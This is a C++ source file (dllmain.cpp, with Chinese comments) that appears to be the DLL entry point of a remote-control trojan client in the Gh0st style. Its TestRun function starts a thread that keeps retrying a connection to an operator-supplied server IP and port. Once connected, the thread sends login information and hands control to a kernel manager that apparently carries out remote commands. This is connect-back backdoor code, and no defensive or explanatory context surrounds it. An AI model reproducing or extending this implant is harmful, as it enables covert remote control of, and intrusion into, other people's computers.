// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <iostream>
#include "IOCPClient.h"
#include"LoginServer.h"
#include "KernelManager.h"
HINSTANCE g_hInstance = NULL;

DWORD WINAPI StartClient(LPVOID lParam);
unsigned short g_uPort = 0;
char g_szServerIp[MAX_PATH] = { 0 };
void TestRun(char* szServerIp, unsigned short uPort);
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	{
		g_hInstance = (HINSTANCE)hModule;
		break;
	}
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DWORD WINAPI StartClient(LPVOID lParam)
{
	IOCPClient ClientObject;
	BOOL bOk = FALSE;

	while (TRUE)
	{
		if (bOk == TRUE)
		{
			break;
		}
		DWORD dwTickCount = GetTickCount();
		//printf("%d\r\n", dwTickCount);
		//连接服务器
		if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
		{
			continue;
		}


		SendLoginInfor(&ClientObject, GetTickCount() - dwTickCount);

		CKernelManager	Manager(&ClientObject);
		DWORD dwIndex = 0;
		do 
		{
			dwIndex = WaitForSingleObject(ClientObject.m_EventHandle, 100);
			dwIndex = dwIndex - WAIT_OBJECT_0;
			bOk = TRUE;
		} while (dwIndex != 0);
	}

	std::cout << "退出Do While" << "\r\n";
	
	return 0;
}

void TestRun(char* szServerIp, unsigned short uPort)
{
	//MessageBoxA(NULL, "3", "2", MB_OK);//测试
	memcpy(g_szServerIp, szServerIp, strlen(szServerIp));

	g_uPort = uPort;

	HANDLE ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartClient, NULL, 0, NULL);

	if (ThreadHandle == NULL)
	{
		//MessageBoxA(NULL, "3", "2", MB_OK);//测试
		return;
	}
	WaitForSingleObject(ThreadHandle, INFINITE);
	CloseHandle(ThreadHandle);

}